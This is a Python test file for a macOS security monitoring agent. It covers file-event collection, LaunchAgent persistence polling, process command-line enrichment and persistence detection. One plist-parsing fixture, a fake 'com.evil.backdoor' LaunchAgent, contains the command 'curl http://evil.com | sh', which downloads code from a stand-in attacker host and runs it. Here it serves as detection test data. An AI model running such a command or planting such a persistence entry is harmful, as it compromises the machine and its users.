"""Tests for Phase 7: macOS Production Hardening.

Tests FSEvents file I/O collector, persistence poller, and process
command line enrichment.
"""

import os
import sys
import tempfile
import threading
import time
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import pytest


# ============================================================================
# FSEvents Collector Tests
# ============================================================================


class TestFSEventsCollector:
    """Tests for MacOSFSEventsCollector event handling and filtering."""

    def _make_handler(self):
        """Create an _FSEventsHandler for testing."""
        from agent.collectors.macos_fsevents_collector import _FSEventsHandler

        buffer = []
        lock = threading.Lock()
        return _FSEventsHandler(
            buffer=buffer,
            buffer_lock=lock,
            hostname="testhost",
            excluded_paths=[
                "/Users/*/Library/Caches/*",
                "/Users/*/Library/Logs/*",
                "/tmp/com.apple.*",
            ],
            excluded_extensions=frozenset({".log", ".tmp", ".cache"}),
        ), buffer

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_file_create_event(self):
        """FSEvents correctly maps file creation to file_create event type."""
        handler, buffer = self._make_handler()
        handler._handle("/Users/test/Documents/malware.sh", "file_create")

        assert len(buffer) == 1
        event = buffer[0]
        assert event.source == "file_create"
        assert event.fields["file_path"] == "/Users/test/Documents/malware.sh"
        assert event.fields["event_type"] == "file_create"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_file_modify_event(self):
        """FSEvents correctly maps file modification to file_modify."""
        handler, buffer = self._make_handler()
        handler._handle("/etc/hosts", "file_modify")

        assert len(buffer) == 1
        assert buffer[0].source == "file_modify"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_file_delete_event(self):
        """FSEvents correctly maps file deletion to file_delete."""
        handler, buffer = self._make_handler()
        handler._handle("/tmp/evil_payload", "file_delete")

        assert len(buffer) == 1
        assert buffer[0].source == "file_delete"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_ds_store_filtered(self):
        """.DS_Store files are always filtered out."""
        handler, buffer = self._make_handler()
        handler._handle("/Users/test/Documents/.DS_Store", "file_modify")

        assert len(buffer) == 0

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_excluded_extension_filtered(self):
        """Files with excluded extensions (.log, .tmp, .cache) are filtered."""
        handler, buffer = self._make_handler()
        handler._handle("/var/log/system.log", "file_modify")
        handler._handle("/tmp/scratch.tmp", "file_create")
        handler._handle("/Users/test/Library/data.cache", "file_modify")

        assert len(buffer) == 0

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_excluded_path_pattern_filtered(self):
        """Files matching excluded path patterns are filtered."""
        handler, buffer = self._make_handler()
        handler._handle(
            "/Users/test/Library/Caches/com.apple.Safari/data.bin", "file_modify"
        )
        handler._handle(
            "/Users/test/Library/Logs/DiagnosticReports/report.txt", "file_create"
        )

        assert len(buffer) == 0

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_apple_tmp_pattern_filtered(self):
        """Files matching /tmp/com.apple.* are filtered."""
        handler, buffer = self._make_handler()
        handler._handle("/tmp/com.apple.launchd/something", "file_create")

        assert len(buffer) == 0

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_deduplication_within_window(self):
        """Rapid duplicate events for the same path are deduplicated."""
        handler, buffer = self._make_handler()

        handler._handle("/Users/test/file.txt", "file_modify")
        handler._handle("/Users/test/file.txt", "file_modify")
        handler._handle("/Users/test/file.txt", "file_modify")

        assert len(buffer) == 1  # Only the first event passes

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_different_paths_not_deduplicated(self):
        """Events for different paths are NOT deduplicated."""
        handler, buffer = self._make_handler()

        handler._handle("/Users/test/file1.txt", "file_modify")
        handler._handle("/Users/test/file2.txt", "file_modify")

        assert len(buffer) == 2

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_launch_agents_path_not_filtered(self):
        """LaunchAgent plist writes are NOT filtered (critical for persistence detection)."""
        handler, buffer = self._make_handler()
        handler._handle(
            "/Library/LaunchAgents/com.evil.agent.plist", "file_create"
        )

        assert len(buffer) == 1
        assert buffer[0].fields["file_path"] == "/Library/LaunchAgents/com.evil.agent.plist"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_collector_lifecycle(self):
        """Collector start/stop/collect lifecycle works."""
        from agent.collectors.macos_fsevents_collector import MacOSFSEventsCollector

        collector = MacOSFSEventsCollector(
            watched_paths=["/tmp"],
        )
        assert collector.name() == "macos_fsevents"

        collector.start()
        try:
            # Should be running
            assert collector._observer is not None
            # Collect should return empty (no events yet)
            events = collector.collect()
            assert isinstance(events, list)
        finally:
            collector.stop()
            assert collector._observer is None

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_recent_paths_tracking(self):
        """get_recent_paths returns paths seen within dedup window."""
        handler, buffer = self._make_handler()
        handler._handle("/Users/test/recent.txt", "file_create")

        recent = handler.get_recent_paths()
        assert "/Users/test/recent.txt" in recent


# ============================================================================
# Persistence Poller Tests
# ============================================================================


class TestPersistencePoller:
    """Tests for MacOSPersistencePoller."""

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_new_plist_triggers_file_create(self):
        """A new plist file in a watched directory triggers a file_create event."""
        from agent.collectors.macos_persistence_poller import MacOSPersistencePoller

        with tempfile.TemporaryDirectory() as tmpdir:
            poller = MacOSPersistencePoller(
                directories=[tmpdir],
                poll_interval=1.0,
            )
            # Initial snapshot (empty)
            poller._snapshots[tmpdir] = poller._snapshot_dir(tmpdir)

            # Create a file
            plist_path = os.path.join(tmpdir, "com.test.agent.plist")
            import plistlib
            plist_data = {
                "Label": "com.test.agent",
                "ProgramArguments": ["/usr/bin/python3", "-c", "print('hello')"],
                "RunAtLoad": True,
            }
            with open(plist_path, "wb") as f:
                plistlib.dump(plist_data, f)

            # Run poll cycle
            poller._poll_cycle()

            events = poller.collect()
            assert len(events) == 1
            assert events[0].source == "file_create"
            assert events[0].fields["file_path"] == plist_path
            assert events[0].fields.get("plist_label") == "com.test.agent"
            assert events[0].fields.get("plist_run_at_load") == "True"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_modified_plist_triggers_file_modify(self):
        """Modifying a plist triggers file_modify with old/new hash."""
        from agent.collectors.macos_persistence_poller import MacOSPersistencePoller

        with tempfile.TemporaryDirectory() as tmpdir:
            plist_path = os.path.join(tmpdir, "com.test.plist")
            import plistlib

            # Create initial file
            with open(plist_path, "wb") as f:
                plistlib.dump({"Label": "test"}, f)

            poller = MacOSPersistencePoller(directories=[tmpdir], poll_interval=1.0)
            poller._snapshots[tmpdir] = poller._snapshot_dir(tmpdir)

            # Modify the file
            time.sleep(0.1)  # ensure mtime changes
            with open(plist_path, "wb") as f:
                plistlib.dump({"Label": "test", "RunAtLoad": True}, f)

            poller._poll_cycle()

            events = poller.collect()
            assert len(events) == 1
            assert events[0].source == "file_modify"
            assert "old_sha256" in events[0].fields
            assert events[0].fields["sha256"] != events[0].fields["old_sha256"]

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_deleted_plist_triggers_file_delete(self):
        """Deleting a plist triggers file_delete."""
        from agent.collectors.macos_persistence_poller import MacOSPersistencePoller

        with tempfile.TemporaryDirectory() as tmpdir:
            plist_path = os.path.join(tmpdir, "com.test.plist")
            with open(plist_path, "w") as f:
                f.write("test")

            poller = MacOSPersistencePoller(directories=[tmpdir], poll_interval=1.0)
            poller._snapshots[tmpdir] = poller._snapshot_dir(tmpdir)

            # Delete the file
            os.remove(plist_path)

            poller._poll_cycle()

            events = poller.collect()
            assert len(events) == 1
            assert events[0].source == "file_delete"

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_plist_parsing(self):
        """Plist parser extracts Label, ProgramArguments, RunAtLoad."""
        from agent.collectors.macos_persistence_poller import parse_launch_plist

        with tempfile.NamedTemporaryFile(suffix=".plist", delete=False) as f:
            import plistlib
            plistlib.dump(
                {
                    "Label": "com.evil.backdoor",
                    "ProgramArguments": ["/bin/sh", "-c", "curl http://evil.com | sh"],
                    "RunAtLoad": True,
                    "KeepAlive": True,
                    "StartInterval": 300,
                },
                f,
            )
            path = f.name

        try:
            result = parse_launch_plist(path)
            assert result is not None
            assert result["label"] == "com.evil.backdoor"
            assert result["program_arguments"] == ["/bin/sh", "-c", "curl http://evil.com | sh"]
            assert result["run_at_load"] is True
            assert result["keep_alive"] is True
            assert result["start_interval"] == 300
        finally:
            os.unlink(path)

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_malformed_plist_doesnt_crash(self):
        """A malformed (non-plist) file doesn't crash the parser."""
        from agent.collectors.macos_persistence_poller import parse_launch_plist

        with tempfile.NamedTemporaryFile(suffix=".plist", delete=False) as f:
            f.write(b"this is not a valid plist\x00\xff\xfe")
            path = f.name

        try:
            result = parse_launch_plist(path)
            assert result is None
        finally:
            os.unlink(path)

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_fsevents_deduplication(self):
        """If FSEvents already reported a path, the poller skips it."""
        from agent.collectors.macos_persistence_poller import MacOSPersistencePoller

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a mock FSEvents collector
            mock_fsevents = MagicMock()
            plist_path = os.path.join(tmpdir, "test.plist")

            poller = MacOSPersistencePoller(
                directories=[tmpdir],
                poll_interval=1.0,
                fsevents_collector=mock_fsevents,
            )
            poller._snapshots[tmpdir] = poller._snapshot_dir(tmpdir)

            # Create a file
            with open(plist_path, "w") as f:
                f.write("test")

            # Mock FSEvents as having already seen this path
            mock_fsevents.get_recent_paths.return_value = {plist_path}

            poller._poll_cycle()

            events = poller.collect()
            assert len(events) == 0  # Deduped

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_poller_lifecycle(self):
        """Poller start/stop lifecycle."""
        from agent.collectors.macos_persistence_poller import MacOSPersistencePoller

        with tempfile.TemporaryDirectory() as tmpdir:
            poller = MacOSPersistencePoller(
                directories=[tmpdir], poll_interval=60.0
            )
            assert poller.name() == "macos_persistence_poller"

            poller.start()
            assert poller._thread is not None
            poller.stop()
            assert poller._thread is None


# ============================================================================
# Process Command Line Enrichment Tests
# ============================================================================


class TestProcEnricher:
    """Tests for macOS process command line enrichment."""

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_get_own_cmdline(self):
        """get_process_cmdline(os.getpid()) returns current process's command line."""
        from agent.collectors.macos_proc_enricher import get_process_cmdline

        cmdline = get_process_cmdline(os.getpid())
        assert cmdline is not None
        assert len(cmdline) > 0
        # Should contain 'python' or 'pytest' somewhere
        assert "python" in cmdline.lower() or "pytest" in cmdline.lower()

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_nonexistent_pid_returns_none(self):
        """get_process_cmdline(99999999) returns None for non-existent PID."""
        from agent.collectors.macos_proc_enricher import get_process_cmdline

        result = get_process_cmdline(99999999)
        assert result is None

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_enrichment_updates_command_line(self):
        """enrich_process_event updates command_line when successful."""
        from agent.collectors.macos_proc_enricher import enrich_process_event

        raw_data = {
            "source": "unified_log",
            "fields": {
                "pid": str(os.getpid()),
                "name": "python",
            },
        }

        result = enrich_process_event(raw_data)
        cmd = result["fields"].get("command_line", "")
        assert len(cmd) > 0

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_enrichment_skips_non_process_sources(self):
        """enrich_process_event skips non-process event sources."""
        from agent.collectors.macos_proc_enricher import enrich_process_event

        raw_data = {
            "source": "file_create",
            "fields": {
                "pid": str(os.getpid()),
                "file_path": "/tmp/test",
            },
        }

        result = enrich_process_event(raw_data)
        assert "command_line" not in result["fields"]

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_enrichment_doesnt_crash_on_dead_pid(self):
        """Enrichment for a dead PID doesn't crash the pipeline."""
        from agent.collectors.macos_proc_enricher import enrich_process_event

        raw_data = {
            "source": "unified_log",
            "fields": {
                "pid": "99999999",
                "name": "dead_process",
            },
        }

        # Should not raise
        result = enrich_process_event(raw_data)
        assert result is raw_data  # Returns same dict

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_enrichment_skips_zero_pid(self):
        """PID 0 (kernel) is skipped."""
        from agent.collectors.macos_proc_enricher import enrich_process_event

        raw_data = {
            "source": "unified_log",
            "fields": {"pid": "0", "name": "kernel"},
        }

        result = enrich_process_event(raw_data)
        assert "command_line" not in result["fields"]

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_enrichment_skips_complete_cmdline(self):
        """Events with complete command lines (containing spaces) are skipped."""
        from agent.collectors.macos_proc_enricher import enrich_process_event

        raw_data = {
            "source": "unified_log",
            "fields": {
                "pid": str(os.getpid()),
                "name": "python",
                "command_line": "/usr/bin/python3 -m pytest tests/",
            },
        }

        result = enrich_process_event(raw_data)
        # Should keep existing command_line unchanged
        assert result["fields"]["command_line"] == "/usr/bin/python3 -m pytest tests/"


# ============================================================================
# Normalizer Integration Tests
# ============================================================================


class TestNormalizerIntegration:
    """Tests for file event normalization from FSEvents/poller sources."""

    def test_file_rename_mapped_to_normalizer(self):
        """file_rename source is mapped to the file normalizer."""
        from agent.normalizer import _NORMALIZERS

        assert "file_rename" in _NORMALIZERS

    def test_fsevents_file_create_normalizes(self):
        """A file_create event from FSEvents normalizes to FileActivity."""
        from agent.collectors.base import RawEvent
        from agent.normalizer import normalize
        from agent.schema.ocsf_types import FileActivity

        raw = RawEvent(
            timestamp=datetime.now(timezone.utc),
            source="file_create",
            message="file_create: /tmp/test.txt",
            fields={
                "file_path": "/tmp/test.txt",
                "event_type": "file_create",
                "pid": "0",
                "name": "unknown",
            },
            hostname="testhost",
        )

        ocsf = normalize(raw)
        assert isinstance(ocsf, FileActivity)
        assert ocsf.activity_id == 1  # Create
        assert ocsf.file_path == "/tmp/test.txt"

    def test_fsevents_file_delete_normalizes(self):
        """A file_delete event normalizes to FileActivity with activity_id=4."""
        from agent.collectors.base import RawEvent
        from agent.normalizer import normalize
        from agent.schema.ocsf_types import FileActivity

        raw = RawEvent(
            timestamp=datetime.now(timezone.utc),
            source="file_delete",
            message="file_delete: /tmp/test.txt",
            fields={
                "file_path": "/tmp/test.txt",
                "event_type": "file_delete",
                "pid": "0",
                "name": "unknown",
            },
            hostname="testhost",
        )

        ocsf = normalize(raw)
        assert isinstance(ocsf, FileActivity)
        assert ocsf.activity_id == 4  # Delete

    def test_persistence_detection_on_fsevents_launchagent(self):
        """FSEvents file_create in LaunchAgents path triggers persistence detection."""
        from agent.collectors.base import RawEvent
        from agent.normalizer import normalize
        from agent.processor.entity_extractor import extract_entities

        raw = RawEvent(
            timestamp=datetime.now(timezone.utc),
            source="file_create",
            message="file_create: /Library/LaunchAgents/com.evil.plist",
            fields={
                "file_path": "/Library/LaunchAgents/com.evil.plist",
                "event_type": "file_create",
                "pid": "0",
                "name": "unknown",
            },
            hostname="testhost",
        )

        ocsf = normalize(raw)
        entities = extract_entities(ocsf, event_id=1)

        # Should have file node
        assert len(entities.files) == 1
        assert entities.files[0].path == "/Library/LaunchAgents/com.evil.plist"

        # Should trigger persistence detection
        assert len(entities.risk_indicators) == 1
        indicator = entities.risk_indicators[0]
        assert indicator["type"] == "persistence"
        assert indicator["persistence_type"] == "launch_agent"
        assert indicator["mitre_technique"] == "T1543.001"


# ============================================================================
# Collector Registration Tests
# ============================================================================


class TestCollectorRegistration:
    """Tests for collector registration in __init__.py."""

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_macos_collectors_include_fsevents(self):
        """macOS collectors include FSEvents collector."""
        from agent.collectors import get_collectors

        collectors = get_collectors()
        names = [c.name() for c in collectors]
        assert "macos_fsevents" in names

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_macos_collectors_include_persistence_poller(self):
        """macOS collectors include persistence poller."""
        from agent.collectors import get_collectors

        collectors = get_collectors()
        names = [c.name() for c in collectors]
        assert "macos_persistence_poller" in names

    @pytest.mark.skipif(sys.platform != "darwin", reason="macOS only")
    def test_collector_count(self):
        """macOS should have at least 5 collectors: psutil, macos, dns, fsevents, persistence."""
        from agent.collectors import get_collectors

        collectors = get_collectors()
        assert len(collectors) >= 5
